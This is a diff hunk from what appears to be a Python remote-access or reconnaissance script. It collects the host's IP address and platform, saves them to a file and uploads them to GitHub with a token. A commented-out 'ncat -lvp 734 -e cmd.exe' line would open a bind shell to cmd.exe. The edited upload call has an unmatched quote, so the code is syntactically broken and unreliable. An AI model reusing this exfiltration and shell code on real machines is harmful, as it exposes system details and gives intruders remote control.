@@ -83,7 +83,7 @@ def run(token):
         stmnt= 'Info: '+ IPAddr+'    |   '+sysconfig.get_platform()
         create_file("data.txt",stmnt)
         #subir_archivo('data.txt', stmnt )
-        update_file_on_github("data.txt",token)
+        update_file_on_github(stmnt",token)
         #delete_file("data.txt")
         
         #os.system('ncat -lvp 734 -e cmd.exe')
